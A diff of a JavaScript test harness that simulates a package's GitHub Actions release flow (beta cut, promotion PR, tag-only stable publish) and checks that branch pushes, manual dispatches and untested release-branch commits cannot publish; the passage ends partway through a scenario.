@@ -7,7 +7,10 @@ import { fileURLToPath } from "node:url";
 import {
   BETA_REGISTRY_SLUG,
   EMDASH_PUBLISH_JOB_IF,
+  computeTargetVersion,
+  readPendingChangesets,
   PACKAGE_NAME,
+  STABLE_REGISTRY_SLUG,
   repositoryRoot,
   runReleaseFlowCli,
   validateEmDashDispatchGate,
@@ -51,23 +54,27 @@ export async function verifyShippedEmDashWorkflowGateBinding() {
   }
 
   const gateIdx = emdashWorkflowText.indexOf("node .github/scripts/emdash-dispatch-gate.mjs");
-  const mintIdx = emdashWorkflowText.indexOf("actions/create-github-app-token@");
   const prepareIdx = emdashWorkflowText.indexOf("node .github/scripts/prepare-emdash-release.mjs");
   const attestIdx = emdashWorkflowText.indexOf("actions/attest-build-provenance@");
   const releaseActionIdx = emdashWorkflowText.indexOf("emdash-cms/emdash/apps/release-action@");
   const verifyIdx = emdashWorkflowText.indexOf("node .github/scripts/verify-registry-release.mjs");
   if (
     gateIdx === -1 ||
-    mintIdx === -1 ||
     prepareIdx === -1 ||
     attestIdx === -1 ||
     releaseActionIdx === -1 ||
     verifyIdx === -1 ||
-    !(gateIdx < mintIdx && gateIdx < prepareIdx && prepareIdx < attestIdx && attestIdx < releaseActionIdx && releaseActionIdx < verifyIdx)
+    !(gateIdx < prepareIdx && prepareIdx < attestIdx && attestIdx < releaseActionIdx && releaseActionIdx < verifyIdx)
   ) {
     throw new Error(
-      "emdash-release.yml must run .github/scripts/emdash-dispatch-gate.mjs before token minting, bundle preparation, build provenance attestation, delegated release-action publish, and PDS verification",
+      "emdash-release.yml must run .github/scripts/emdash-dispatch-gate.mjs before bundle preparation, build provenance attestation, delegated release-action publish, and PDS verification",
     );
+  }
+
+  // The Registry job holds no GitHub write token: tags and branches are pushed only by release.yml's
+  // button and merge runs, and the tag run publishes what is already there.
+  if (emdashWorkflowText.includes("actions/create-github-app-token@") || emdashWorkflowText.includes("RELEASE_APP_PRIVATE_KEY")) {
+    throw new Error("emdash-release.yml must not mint a GitHub App token; the version tag already exists when it runs");
   }
 
   if (
@@ -93,9 +100,11 @@ export async function verifyShippedEmDashWorkflowGateBinding() {
 
   if (
     !releaseWorkflowText.includes("uses: ./.github/workflows/emdash-release.yml") ||
-    !releaseWorkflowText.includes("release_mode: stable")
+    !releaseWorkflowText.includes("release_mode: ${{ needs.release-tag.outputs.release_mode }}") ||
+    !/^\s+tags: \["v\*\.\*\.\*"\]$/m.test(releaseWorkflowText) ||
+    !releaseWorkflowText.includes("needs: release-tag")
   ) {
-    throw new Error("release.yml must delegate to emdash-release.yml with release_mode: stable");
+    throw new Error("release.yml must publish only from its version-tag run, delegating to emdash-release.yml with the tag's release_mode");
   }
 
   // Cut beta is release.yml's button too: emdash-release.yml has none of its own, so the release
@@ -104,8 +113,8 @@ export async function verifyShippedEmDashWorkflowGateBinding() {
   if (!emdashTriggers.includes("workflow_call:") || emdashTriggers.includes("workflow_dispatch")) {
     throw new Error("emdash-release.yml must be workflow_call-only; Cut beta is a release.yml workflow_dispatch");
   }
-  if (!releaseWorkflowText.includes("release_mode: beta")) {
-    throw new Error("release.yml must delegate Cut beta to emdash-release.yml with release_mode: beta");
+  if (!releaseWorkflowText.includes("node scripts/release-flow.mjs verify-release-tag")) {
+    throw new Error("release.yml's tag run must check the tag sits on its release branch before the Registry job");
   }
 
   return {
@@ -313,73 +322,49 @@ function createStubEnvironment({
     throw new Error(`Unexpected gh command: ${args.join(" ")}`);
   };
 
+  // Stands in for `npm run release:version` (changeset version plus the manifest sync): the version
+  // pending changesets make, a CHANGELOG section listing them, and every changeset consumed.
   const npmExec = async (args, cwd) => {
     events.push(`npm:${args.join(" ")}`);
     if (args[0] === "run" && args[1] === "release:version") {
-      const pkgPath = join(cwd, "package.json");
-      const pkg = JSON.parse(await readFile(pkgPath, "utf8"));
-      pkg.version = "0.2.9";
-      await writeFile(pkgPath, `${JSON.stringify(pkg, null, 2)}\n`, "utf8");
-
-      const lockPath = join(cwd, "package-lock.json");
-      const lock = JSON.parse(await readFile(lockPath, "utf8"));
-      lock.version = "0.2.9";
-      if (lock.packages?.[""]) {
-        lock.packages[""].version = "0.2.9";
+      const pkg = JSON.parse(await readFile(join(cwd, "package.json"), "utf8"));
+      const pending = await readPendingChangesets(cwd, { includeEmpty: true });
+      const bumping = pending.filter((entry) => !entry.empty);
+      const version = computeTargetVersion(pkg.version, bumping.map((entry) => entry.bump));
+      for (const file of ["package.json", "package-lock.json", "emdash-plugin.jsonc"]) {
+        const path = join(cwd, file);
+        const value = JSON.parse(await readFile(path, "utf8"));
+        // A manifest without a version (the Registry workspace stamps it) stays without one.
+        if (file !== "emdash-plugin.jsonc" || "version" in value) value.version = version;
+        if (value.packages?.[""]) value.packages[""].version = version;
+        await writeFile(path, `${JSON.stringify(value, null, 2)}\n`, "utf8");
       }
-      await writeFile(lockPath, `${JSON.stringify(lock, null, 2)}\n`, "utf8");
-
+      const changelogPath = join(cwd, "CHANGELOG.md");
+      const changelog = await readFile(changelogPath, "utf8");
+      const lines = bumping.map((entry) => `- ${entry.summary}`).join("\n");
       await writeFile(
-        join(cwd, "CHANGELOG.md"),
-        [
-          "# @dinkuskit/payments",
-          "",
-          "## 0.2.9",
-          "",
-          "### Patch Changes",
-          "",
-          "- Fix checkout callback status handling.",
-          "",
-          "## 0.2.8",
-          "",
-          "- Baseline release.",
-        ].join("\n") + "\n",
+        changelogPath,
+        changelog.replace(/^## /m, `## ${version}\n\n### Changes\n\n${lines}\n\n## `),
         "utf8",
       );
-      await rm(join(cwd, ".changeset/add-feature.md"), { force: true });
-      await rm(join(cwd, ".changeset/empty-note.md"), { force: true });
+      for (const entry of pending) {
+        await rm(join(cwd, entry.filePath), { force: true });
+      }
     }
   };
 
   return { state, fetchImpl, ghExec, npmExec };
 }
 
-async function runWorkflowDispatchSimulation({
-  eventName,
-  ref,
-  inputVersion = "",
-  releaseMode = "",
-  events,
-  runCutBeta,
-  runPublish,
-}) {
+// Runs emdash-release.yml's gate the way a version tag's run reaches it: the real extracted gate
+// script as a child process, checked against the JS gate, then the publish when both allow it.
+async function runRegistryJobSimulation({ eventName, ref, inputVersion = "", releaseMode = "", events, runPublish }) {
   events.push(
-    `workflow:emdash-release:start:event=${eventName}:ref=${ref}:mode=${releaseMode || "(none)"}:version=${inputVersion || "(auto)"}`,
+    `workflow:emdash-release:start:event=${eventName}:ref=${ref}:mode=${releaseMode || "(none)"}:version=${inputVersion || "(none)"}`,
   );
 
-  // Execute the real extracted workflow gate script as a child process
-  const scriptResult = runExtractedGateScriptProcess({
-    eventName,
-    ref,
-    inputVersion,
-    releaseMode,
-  });
-  const jsGate = validateEmDashDispatchGate({
-    eventName,
-    ref,
-    inputVersion,
-    releaseMode,
-  });
+  const scriptResult = runExtractedGateScriptProcess({ eventName, ref, inputVersion, releaseMode });
+  const jsGate = validateEmDashDispatchGate({ eventName, ref, inputVersion, releaseMode });
 
   if (Boolean(scriptResult.exitCode === 0) !== jsGate.ok) {
     throw new Error(
@@ -393,843 +378,562 @@ async function runWorkflowDispatchSimulation({
   }
 
   events.push(`workflow:emdash-release:gate-script:exit=0:mode=${jsGate.mode}`);
-  if (eventName === "workflow_dispatch") {
-    events.push("credential:mint-github-app-token:[REDACTED]");
-    await runCutBeta();
-  }
   await runPublish(jsGate.slug, jsGate.requestedVersion);
   return { ok: true, gate: jsGate, scriptResult };
 }
+
+function cliDeps(root, gitExec, env, logs = []) {
+  return {
+    root,
+    gitExec,
+    ghExec: env.ghExec,
+    fetchImpl: env.fetchImpl,
+    npmExec: env.npmExec,
+    log: (line) => logs.push(line),
+  };
+}
+
+async function commitOnMain(root, files, message) {
+  git(["checkout", "-q", "-f", "main"], root);
+  for (const [path, content] of Object.entries(files)) {
+    if (content === null) {
+      await rm(join(root, path), { force: true });
+    } else {
+      await writeFile(join(root, path), content, "utf8");
+    }
+  }
+  git(["add", "-A"], root);
+  git(["commit", "-q", "-m", message], root);
+  return git(["rev-parse", "HEAD"], root);
+}
+
+// Merges the ci: release PR into main with a merge commit, the other way GitHub merges it.
+function mergeCommitReleasePr(root) {
+  git(["checkout", "-q", "-f", "main"], root);
+  git(["merge", "-q", "--no-ff", "-m", "Merge pull request #55 from dinkuskit/changeset-release/main", "changeset-release/main"], root);
+  return git(["rev-parse", "HEAD"], root);
+}
+
+// Squash-merges the ci: release PR into main with the PR's message, the way the owner merges it.
+function squashMergeReleasePr(root) {
+  const message = git(["log", "-1", "--format=%B", "changeset-release/main"], root);
+  git(["checkout", "-q", "-f", "main"], root);
+  git(["merge", "-q", "--squash", "changeset-release/main"], root);
+  git(["commit", "-q", "-m", message], root);
+  return git(["rev-parse", "HEAD"], root);
+}
+
+// A version tag's run: release.yml's tag job, then the Registry job with the tag's release_mode.
+async function runTagRun({ root, gitExec, env, events, tag }) {
+  const ref = `refs/tags/${tag}`;
+  events.push(`workflow:release:push:${ref}`);
+  const checked = await runReleaseFlowCli(["verify-release-tag", "--ref", ref], cliDeps(root, gitExec, env));
+  const registry = await runRegistryJobSimulation({
+    eventName: "push",
+    ref,
+    inputVersion: checked.version,
+    releaseMode: checked.releaseMode,
+    events,
+    runPublish: async (slug, version) => {
+      const check = await runReleaseFlowCli(
+        ["check-registry-version", "--slug", slug, "--version", version],
+        cliDeps(root, gitExec, env),
+      );
+      if (!check.alreadyPublished) {
+        events.push("credential:oidc-attest-provenance");
+        events.push(`registry:publish:${slug}@${version}`);
+        (slug === BETA_REGISTRY_SLUG ? env.state.betaVersions : env.state.stableVersions).push(version);
+      }
+    },
+  });
+  return { checked, registry };
+}
+
+const SIDE_EFFECT = (e) =>
+  e.startsWith("git:tag:") ||
+  e.startsWith("git:push:") ||
+  e.startsWith("gh:release:create:") ||
+  e.startsWith("registry:publish:");
+
+async function captureError(run) {
+  try {
+    await run();
+    return null;
+  } catch (error) {
+    return error instanceof Error ? error.message : String(error);
+  }
+}
+
+async function withSeededRepo(prefix, body) {
+  const events = [];
+  const { root, gitExec } = await createSeededRepo(prefix, events);
+  try {
+    return await body({ events, root, gitExec });
+  } finally {
+    await rm(root, { recursive: true, force: true });
+  }
+}
+
+const FEATURE_CHANGESET = `---\n"${PACKAGE_NAME}": minor\n---\n\nAdd gift notes at checkout.\n`;
+const FIX_CHANGESET = `---\n"${PACKAGE_NAME}": patch\n---\n\nKeep the shipping total after a refresh.\n`;
 
 export async function runReleaseAuthorityProof() {
   const workflowBinding = await verifyShippedEmDashWorkflowGateBinding();
   const scenarios = [];
 
-  // Scenario (a): Approved main release path succeeds and performs tag, GitHub Release, Registry publish
-  {
-    const events = [];
-    const { root, gitExec } = await createSeededRepo("approved-main", events);
-    try {
-      const env = createStubEnvironment({ events });
-      const logs = [];
+  // Scenario (a): the whole path. Cut beta makes release/0.2.9 and its beta, a feature merges to
+  // main while the beta is on test, Promote opens the release PR, the merge tags v0.2.9 on the
+  // branch, and the tag run publishes stable. Main keeps the feature's changeset for the next cut.
+  await withSeededRepo("approved-path", async ({ events, root, gitExec }) => {
+    const env = createStubEnvironment({ events });
+    const cut = await runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env));
+    const betaRun = await runTagRun({ root, gitExec, env, events, tag: cut.betaTag });
 
-      // 1. Cut beta on main via manual workflow_dispatch
-      let cutResult;
-      await runWorkflowDispatchSimulation({
-        eventName: "workflow_dispatch",
-        ref: "refs/heads/main",
-        inputVersion: "",
-        releaseMode: "beta",
-        events,
-        runCutBeta: async () => {
-          cutResult = await runReleaseFlowCli(["cut-beta"], {
-            root,
-            gitExec,
-            ghExec: env.ghExec,
-            fetchImpl: env.fetchImpl,
-            log: (l) => logs.push(l),
-          });
-        },
-        runPublish: async (slug) => {
-          const check = await runReleaseFlowCli(
-            ["check-registry-version", "--slug", slug, "--version", cutResult.version],
-            { root, gitExec, ghExec: env.ghExec, fetchImpl: env.fetchImpl, log: (l) => logs.push(l) },
-          );
-          if (!check.alreadyPublished) {
-            events.push(`credential:oidc-attest-provenance`);
-            events.push(`registry:publish:${slug}@${cutResult.version}`);
-            env.state.betaVersions.push(cutResult.version);
-          }
-        },
-      });
+    const featureSha = await commitOnMain(root, { ".changeset/gift-notes.md": FEATURE_CHANGESET, "src/gift.ts": "export const gift = true;\n" }, "feat: gift notes");
+    const recutError = await captureError(() => runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env)));
 
-      // 2. Promote verified beta on main
-      events.push("credential:mint-github-app-token:[REDACTED]");
-      const promoteResult = await runReleaseFlowCli(
-        [
-          "promote",
-          "--beta-version",
-          "0.2.9-beta.1",
-          "--proof-ref",
-          "https://github.com/dinkuskit/payments/actions/runs/701 (0.2.9-beta.1 @running pass)",
-        ],
-        {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          npmExec: env.npmExec,
-          log: (l) => logs.push(l),
-        },
-      );
-
-      // 3. Merge ci: release PR to main and run publish-merged-release + delegated emdash-release.yml (event=push, release_mode=stable)
-      git(["checkout", "main"], root);
-      git(["merge", "--ff-only", "changeset-release/main"], root);
-      events.push("workflow:release:push:refs/heads/main");
-      events.push("credential:mint-github-app-token:[REDACTED]");
-      const publishResult = await runReleaseFlowCli(["publish-merged-release"], {
-        root,
-        gitExec,
-        ghExec: env.ghExec,
-        fetchImpl: env.fetchImpl,
-        log: (l) => logs.push(l),
-      });
-
-      if (publishResult.published || publishResult.registryNeeded) {
-        await runWorkflowDispatchSimulation({
-          eventName: "push",
-          ref: "refs/heads/main",
-          inputVersion: publishResult.version,
-          releaseMode: "stable",
-          events,
-          runCutBeta: async () => {},
-          runPublish: async (slug, version) => {
-            const check = await runReleaseFlowCli(
-              ["check-registry-version", "--slug", slug, "--version", version],
-              { root, gitExec, ghExec: env.ghExec, fetchImpl: env.fetchImpl, log: (l) => logs.push(l) },
-            );
-            if (!check.alreadyPublished) {
-              events.push(`credential:oidc-attest-provenance`);
-              events.push(`registry:publish:${slug}@${version}`);
-              env.state.stableVersions.push(version);
-            }
-          },
-        });
-      }
-
-      scenarios.push({
-        id: "a",
-        name: "approved_main_release_path_succeeds",
-        status: "PASS",
-        outcome: {
-          betaVersion: cutResult.version,
-          promotedTarget: promoteResult.targetVersion,
-          publishedVersion: publishResult.version,
-          tagCreated: publishResult.tagCreated,
-          githubReleaseCreated: publishResult.githubReleaseCreated,
-          registryPublished: env.state.stableVersions.includes("0.2.9"),
-        },
-        sideEffects: events,
-      });
-    } finally {
-      await rm(root, { recursive: true, force: true });
-    }
-  }
-
-  // Scenario (b): Manual stable dispatch is rejected before credential/Registry I/O
-  {
-    const events = [];
-    const res = await runWorkflowDispatchSimulation({
-      eventName: "workflow_dispatch",
-      ref: "refs/heads/main",
-      inputVersion: "0.2.9",
-      releaseMode: "beta",
-      events,
-      runCutBeta: async () => {
-        events.push("UNEXPECTED:cut-beta");
-      },
-      runPublish: async () => {
-        events.push("UNEXPECTED:registry-publish");
-      },
-    });
-    const touchedCredsOrRegistry = events.some(
-      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:"),
+    const promoted = await runReleaseFlowCli(
+      ["promote", "--beta-version", cut.version, "--proof-ref", `https://github.com/dinkuskit/live-journeys/actions/runs/701 (${cut.version} @running pass)`],
+      cliDeps(root, gitExec, env),
     );
-    if (res.ok || touchedCredsOrRegistry) {
-      throw new Error("Scenario (b) failed: manual stable dispatch was not rejected before credential/Registry I/O");
+    const prFiles = git(["diff", "--name-only", "main", "changeset-release/main"], root).split("\n").filter(Boolean);
+    squashMergeReleasePr(root);
+    events.push("workflow:release:push:refs/heads/main");
+    const finished = await runReleaseFlowCli(["publish-merged-release"], cliDeps(root, gitExec, env));
+    const stableRun = await runTagRun({ root, gitExec, env, events, tag: finished.tag });
+
+    git(["checkout", "-q", "-f", "main"], root);
+    const mainPkg = JSON.parse(await readFile(join(root, "package.json"), "utf8"));
+    const mainPending = (await readPendingChangesets(root)).map((entry) => entry.filePath);
+    const branchHasFeature = git(["branch", "--contains", featureSha], root).includes("release/0.2.9");
+    const ok =
+      cut.version === "0.2.9-beta.1" &&
+      cut.releaseBranch === "release/0.2.9" &&
+      betaRun.registry.ok &&
+      env.state.betaVersions.includes("0.2.9-beta.1") &&
+      recutError?.includes("release/0.2.9 is still on test") &&
+      promoted.releaseBranch === "release/0.2.9" &&
+      prFiles.every((path) => ["package.json", "package-lock.json", "emdash-plugin.jsonc", "CHANGELOG.md", ".changeset/add-feature.md"].includes(path)) &&
+      finished.tagPushed &&
+      stableRun.checked.githubReleaseCreated &&
+      env.state.stableVersions.includes("0.2.9") &&
+      mainPkg.version === "0.2.9" &&
+      mainPending.length === 1 &&
+      mainPending[0] === ".changeset/gift-notes.md" &&
+      !branchHasFeature;
+    if (!ok) {
+      throw new Error(
+        `Scenario (a) failed: ${JSON.stringify({ cut, recutError, prFiles, finished, mainVersion: mainPkg.version, mainPending, branchHasFeature })}`,
+      );
     }
     scenarios.push({
-      id: "b",
-      name: "manual_stable_dispatch_rejected_before_credentials_and_registry_io",
+      id: "a",
+      name: "release_branch_path_succeeds_while_main_keeps_merging",
       status: "PASS",
       outcome: {
-        ok: res.ok,
-        code: res.gate.code,
-        scriptExitCode: res.scriptResult.exitCode,
-        credentialOrRegistryIoCount: 0,
+        betaVersion: cut.version,
+        releaseBranch: cut.releaseBranch,
+        promotedTarget: promoted.targetVersion,
+        releasePrFiles: prFiles,
+        stableTag: finished.tag,
+        githubReleaseCreated: stableRun.checked.githubReleaseCreated,
+        mainStillPending: mainPending,
       },
       sideEffects: events,
     });
-  }
+  });
 
-  // Scenario (c): Non-main dispatch is rejected before credential/Registry I/O
+  // Scenario (b): a Run workflow press on a branch never publishes, whatever version or mode it
+  // names; only Retry the publish pressed on a version tag reaches the tag's own publish.
   {
     const events = [];
-    const res = await runWorkflowDispatchSimulation({
+    const cases = [
+      { inputVersion: "", releaseMode: "beta" },
+      { inputVersion: "0.2.9-beta.1", releaseMode: "beta" },
+      { inputVersion: "0.2.9", releaseMode: "stable" },
+    ];
+    const results = [];
+    for (const item of cases) {
+      results.push(
+        await runRegistryJobSimulation({
+          eventName: "workflow_dispatch",
+          ref: "refs/heads/main",
+          ...item,
+          events,
+          runPublish: async () => events.push("UNEXPECTED:publish"),
+        }),
+      );
+    }
+    const retry = await runRegistryJobSimulation({
       eventName: "workflow_dispatch",
-      ref: "refs/heads/feat/unmerged-branch",
+      ref: "refs/tags/v0.2.9-beta.1",
       inputVersion: "0.2.9-beta.1",
       releaseMode: "beta",
       events,
-      runCutBeta: async () => {
-        events.push("UNEXPECTED:cut-beta");
-      },
-      runPublish: async () => {
-        events.push("UNEXPECTED:registry-publish");
-      },
+      runPublish: async (slug, version) => events.push(`retry:${slug}@${version}`),
     });
-    const touchedCredsOrRegistry = events.some(
-      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:"),
-    );
-    if (res.ok || touchedCredsOrRegistry) {
-      throw new Error("Scenario (c) failed: non-main dispatch was not rejected before credential/Registry I/O");
+    if (
+      results.some((res) => res.ok || res.gate.code !== "dispatch_publish_forbidden") ||
+      events.some((e) => e.startsWith("UNEXPECTED:")) ||
+      !retry.ok ||
+      !events.includes(`retry:${BETA_REGISTRY_SLUG}@0.2.9-beta.1`)
+    ) {
+      throw new Error("Scenario (b) failed: a workflow_dispatch reached the Registry publish");
+    }
+    scenarios.push({
+      id: "b",
+      name: "button_runs_on_branches_never_publish_retry_runs_on_the_tag",
+      status: "PASS",
+      outcome: { codes: results.map((res) => res.gate.code), scriptExitCodes: results.map((res) => res.scriptResult.exitCode) },
+      sideEffects: events,
+    });
+  }
+
+  // Scenario (c): a push to a branch (main or a release branch) never publishes; only a version tag does.
+  {
+    const events = [];
+    const refs = ["refs/heads/main", "refs/heads/release/0.2.9", "refs/tags/release-0.2.9"];
+    const results = [];
+    for (const ref of refs) {
+      results.push(
+        await runRegistryJobSimulation({
+          eventName: "push",
+          ref,
+          inputVersion: "0.2.9",
+          releaseMode: "stable",
+          events,
+          runPublish: async () => events.push("UNEXPECTED:publish"),
+        }),
+      );
+    }
+    if (results.some((res) => res.ok || res.gate.code !== "forbidden_caller_ref") || events.some((e) => e.startsWith("UNEXPECTED:"))) {
+      throw new Error("Scenario (c) failed: a branch push reached the Registry publish");
     }
     scenarios.push({
       id: "c",
-      name: "non_main_dispatch_rejected_before_credentials_and_registry_io",
+      name: "branch_pushes_rejected_only_version_tags_publish",
       status: "PASS",
-      outcome: {
-        ok: res.ok,
-        code: res.gate.code,
-        scriptExitCode: res.scriptResult.exitCode,
-        credentialOrRegistryIoCount: 0,
-      },
+      outcome: { refs, codes: results.map((res) => res.gate.code) },
       sideEffects: events,
     });
   }
 
-  // Scenario (d): Source change after beta approval rejected before tagging or stable side effect
-  {
-    const events = [];
-    const { root, gitExec } = await createSeededRepo("unapproved-source-edit", events);
-    try {
-      const env = createStubEnvironment({ events, betaVersions: [] });
-      const cut = await runReleaseFlowCli(["cut-beta"], {
-        root,
-        gitExec,
-        ghExec: env.ghExec,
-        fetchImpl: env.fetchImpl,
-        log: () => {},
-      });
-      env.state.betaVersions.push(cut.version);
-      await runReleaseFlowCli(
-        [
-          "promote",
-          "--beta-version",
-          "0.2.9-beta.1",
-          "--proof-ref",
-          "run-702 0.2.9-beta.1 @running pass",
-        ],
-        {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          npmExec: env.npmExec,
-          log: () => {},
-        },
-      );
+  // Scenario (d): a commit pushed onto the release branch after the beta (not through Add fix to
+  // beta) stops Promote, and stops the merged release PR from tagging.
+  await withSeededRepo("branch-moved", async ({ events, root, gitExec }) => {
+    const env = createStubEnvironment({ events });
+    const cut = await runReleaseFlowCli(["cut-beta"], cliDeps(root, gitExec, env));
+    env.state.betaVersions.push(cut.version);
+    const proofRef = `run-702 (${cut.version} @running pass)`;
+    await runReleaseFlowCli(["promote", "--beta-version", cut.version, "--proof-ref", proofRef], cliDeps(root, gitExec, env));
+    squashMergeReleasePr(root);
 
-      // Tamper with source on the release branch while preserving the Release-Beta-Proof trailer
-      const releaseMsg = git(["log", "-1", "--format=%B"], root);
-      await writeFile(join(root, "src/plugin.ts"), `export const pluginVersion = "tampered";\n`, "utf8");
-      git(["add", "src/plugin.ts"], root);
-      git(["commit", "--amend", "-m", releaseMsg], root);
+    git(["checkout", "-q", "-f", "release/0.2.9"], root);
+    await writeFile(join(root, "src/plugin.ts"), `export const pluginVersion = "tampered";\n`, "utf8");
+    git(["commit", "-q", "-am", "untested change"], root);
+    git(["checkout", "-q", "-f", "main"], root);
 
-      events.length = 0; // Measure only final-gate side effects
-      let caughtError = null;
-      try {
-        await runReleaseFlowCli(["publish-merged-release"], {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          log: () => {},
-        });
-      } catch (error) {
-        caughtError = error instanceof Error ? error.message : String(error);
-      }
-
-      const stableSideEffects = events.filter(
-        (e) =>
-          e.startsWith("git:tag:") ||
-          e.startsWith("git:push:") ||
-          e.startsWith("gh:release:create:") ||
-          e.startsWith("registry:"),
-      );
-      if (!caughtError || stableSideEffects.length > 0) {
-        throw new Error("Scenario (d) failed: unapproved source change was not rejected before tagging");
-      }
-
-      scenarios.push({
-        id: "d",
-        name: "source_change_after_beta_approval_rejected_before_tagging",
-        status: "PASS",
-        outcome: {
-          rejected: true,
-          error: caughtError,
-          stableSideEffectsCount: stableSideEffects.length,
-        },
-        sideEffects: events,
-      });
-    } finally {
-      await rm(root, { recursive: true, force: true });
-    }
-  }
-
-  // Scenario (e): Resume after tag-exists completes missing GitHub Release and Registry publish steps
-  {
-    const events = [];
-    const { root, gitExec } = await createSeededRepo("resume-existing-tag", events);
-    try {
-      const env = createStubEnvironment({ events, betaVersions: [], stableVersions: [] });
-      const cut = await runReleaseFlowCli(["cut-beta"], {
-        root,
-        gitExec,
-        ghExec: env.ghExec,
-        fetchImpl: env.fetchImpl,
-        log: () => {},
-      });
-      env.state.betaVersions.push(cut.version);
-      await runReleaseFlowCli(
-        [
-          "promote",
-          "--beta-version",
-          "0.2.9-beta.1",
-          "--proof-ref",
-          "run-703 0.2.9-beta.1 @running pass",
-        ],
-        {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          npmExec: env.npmExec,
-          log: () => {},
-        },
-      );
-
-      // Simulate prior partial run that created v0.2.9 tag on HEAD, then failed before GitHub Release & Registry publish
-      git(["tag", "v0.2.9", "HEAD"], root);
-      events.length = 0;
-
-      const resumed = await runReleaseFlowCli(["publish-merged-release"], {
-        root,
-        gitExec,
-        ghExec: env.ghExec,
-        fetchImpl: env.fetchImpl,
-        log: () => {},
-      });
-
-      if (!resumed.published || !resumed.registryNeeded || !resumed.githubReleaseCreated || !resumed.resumedFromExistingTag) {
-        throw new Error(`Scenario (e) failed: unexpected resume state ${JSON.stringify(resumed)}`);
-      }
-
-      // Downstream Registry job runs with caller event=push and release_mode=stable
-      await runWorkflowDispatchSimulation({
-        eventName: "push",
-        ref: "refs/heads/main",
-        inputVersion: resumed.version,
-        releaseMode: "stable",
-        events,
-        runCutBeta: async () => {},
-        runPublish: async (slug, version) => {
-          const check = await runReleaseFlowCli(
-            ["check-registry-version", "--slug", slug, "--version", version],
-            { root, gitExec, ghExec: env.ghExec, fetchImpl: env.fetchImpl, log: () => {} },
-          );
-          if (!check.alreadyPublished) {
-            events.push(`credential:oidc-attest-provenance`);
-            events.push(`registry:publish:${slug}@${version}`);
-            env.state.stableVersions.push(version);
-          }
-        },
-      });
-
-      scenarios.push({
-        id: "e",
-        name: "resume_after_existing_tag_completes_missing_github_release_and_registry_publish",
-        status: "PASS",
-        outcome: {
-          resumedFromExistingTag: resumed.resumedFromExistingTag,
-          tagCreated: resumed.tagCreated,
-          githubReleaseCreated: resumed.githubReleaseCreated,
-          downstreamRegistryTriggered: resumed.published,
-          registryPublished: env.state.stableVersions.includes("0.2.9"),
-        },
-        sideEffects: events,
-      });
-    } finally {
-      await rm(root, { recursive: true, force: true });
-    }
-  }
-
-  // Scenario (f): Registry lookup failure aborts cut-beta before tag creation
-  {
-    const events = [];
-    const { root, gitExec } = await createSeededRepo("registry-failure", events);
-    try {
-      const env = createStubEnvironment({
-        events,
-        registryError: { status: 503, code: "ServiceUnavailable" },
-      });
-      events.length = 0;
-      let caughtError = null;
-      try {
-        await runReleaseFlowCli(["cut-beta"], {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          log: () => {},
-        });
-      } catch (error) {
-        caughtError = error instanceof Error ? error.message : String(error);
-      }
-
-      const betaTags = git(["tag", "--list", "v0.2.9-beta.*"], root)
-        .split("\n")
-        .filter(Boolean);
-      if (!caughtError || betaTags.length > 0) {
-        throw new Error("Scenario (f) failed: Registry lookup error did not abort before tag creation");
-      }
-
-      scenarios.push({
-        id: "f",
-        name: "registry_lookup_failure_aborts_cut_beta_before_tag",
-        status: "PASS",
-        outcome: {
-          aborted: true,
-          error: caughtError,
-          betaTagsCreated: betaTags.length,
-        },
-        sideEffects: events,
-      });
-    } finally {
-      await rm(root, { recursive: true, force: true });
-    }
-  }
-
-  // Scenario (g): Empty changeset accepted and excluded from bump calculation
-  {
-    const events = [];
-    const { root, gitExec } = await createSeededRepo("empty-changeset", events);
-    try {
-      await writeFile(join(root, ".changeset/empty-note.md"), `---\n---\n`, "utf8");
-      git(["add", ".changeset/empty-note.md"], root);
-      git(["commit", "-m", "docs: add empty changeset"], root);
-
-      const env = createStubEnvironment({ events, betaVersions: [] });
-      events.length = 0;
-
-      const prCheck = await runReleaseFlowCli(
-        ["check-pr", "--base", "origin/main", "--head", "feat/docs-plus-fix", "--title", "feat: docs and fix"],
-        {
-          root,
-          gitExec: (args, cwd = root) => {
-            if (args[0] === "diff" && args.includes("origin/main...HEAD")) {
-              return ".changeset/add-feature.md\n.changeset/empty-note.md";
-            }
-            return gitExec(args, cwd);
-          },
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          log: () => {},
-        },
-      );
-
-      const cutResult = await runReleaseFlowCli(["cut-beta"], {
-        root,
-        gitExec,
-        ghExec: env.ghExec,
-        fetchImpl: env.fetchImpl,
-        log: () => {},
-      });
-
-      if (cutResult.version !== "0.2.9-beta.1" || cutResult.changesetCount !== 1) {
-        throw new Error(`Scenario (g) failed: unexpected cutResult ${JSON.stringify(cutResult)}`);
-      }
-
-      scenarios.push({
-        id: "g",
-        name: "empty_changeset_accepted_and_excluded_from_bump_calculation",
-        status: "PASS",
-        outcome: {
-          prCheckFiles: prCheck.changesetFiles,
-          computedBetaVersion: cutResult.version,
-          versionBumpingChangesetCount: cutResult.changesetCount,
-        },
-        sideEffects: events,
-      });
-    } finally {
-      await rm(root, { recursive: true, force: true });
-    }
-  }
-
-  // Scenario (h): Reusable-call handoff with caller event `push` on refs/heads/main + release_mode=stable proceeds
-  {
-    const events = [];
-    const { root, gitExec } = await createSeededRepo("reusable-call-handoff", events);
-    try {
-      const env = createStubEnvironment({ events, betaVersions: ["0.2.9-beta.1"], stableVersions: [] });
-      git(["tag", "v0.2.9-beta.1", "HEAD"], root);
-      await runReleaseFlowCli(
-        [
-          "promote",
-          "--beta-version",
-          "0.2.9-beta.1",
-          "--proof-ref",
-          "run-708 0.2.9-beta.1 @running pass",
-        ],
-        {
-          root,
-          gitExec,
-          ghExec: env.ghExec,
-          fetchImpl: env.fetchImpl,
-          npmExec: env.npmExec,
-          log: () => {},
-        },
-      );
-      git(["checkout", "main"], root);
-      git(["merge", "--ff-only", "changeset-release/main"], root);
-      events.length = 0;
-
-      events.push("workflow:release:push:refs/heads/main");
